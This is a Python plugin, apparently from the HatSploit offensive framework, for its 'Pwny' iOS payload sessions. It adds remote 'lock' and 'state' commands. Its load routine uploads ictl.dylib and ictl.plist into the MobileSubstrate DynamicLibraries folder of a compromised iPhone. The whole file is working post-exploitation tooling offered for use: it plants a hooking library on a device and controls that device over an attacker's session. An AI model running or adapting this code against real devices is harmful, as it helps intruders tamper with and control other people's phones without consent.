"""
This plugin requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

from hatsploit.lib.plugin import Plugin


class HatSploitPlugin(Plugin):
    def __init__(self):
        super().__init__()

        self.backend = ['ictl.dylib', '/tmp/ictl.dylib']

        self.scope = {
            3: {
                'lock': 1,
                'state': 2,
            }
        }

        self.dylib = '/Library/MobileSubstrate/DynamicLibraries/ictl.dylib'
        self.plist = '/Library/MobileSubstrate/DynamicLibraries/ictl.plist'

        self.details = {
            'Name': "Pwny ictl Plugin",
            'Plugin': "ictl",
            'Authors': [
                'Ivan Nikolsky (enty8080) - plugin developer',
            ],
            'Description': "Plugin called ictl for Apple iOS Pwny.",
        }

        self.commands = {
            'ictl': {
                'lock': {
                    'Description': "Lock device.",
                    'Usage': "lock",
                    'MinArgs': 0,
                },
                'state': {
                    'Description': "Get device state.",
                    'Usage': "state",
                    'MinArgs': 0,
                }
            }
        }

    def lock(self, argc, argv):
        self.print_process("Requesting iPhone lock...")
        self.session.send_command('lock', scope=self.scope)

    def state(self, argc, argv):
        state = self.session.send_command('state', scope=self.scope)
        self.print_info(f"State: {state}")

    def load(self):
        self.print_process("Checking ictl installation...")

        if self.session.send_command(f'ls {self.dylib}', True) == self.dylib:
            if self.session.send_command(f'ls {self.plist}', True) == self.plist:
                return

        self.print_process("Installing ictl.dylib...")
        if not self.session.upload(self.session.pwny + 'data/ictl.dylib', self.dylib):
            self.print_error("Failed to install ictl.dylib!")
            return

        self.print_process("Installing ictl.plist...")
        if not self.session.upload(self.session.pwny + 'data/ictl.plist', self.plist):
            self.print_error("Failed to install ictl.plist!")
            return
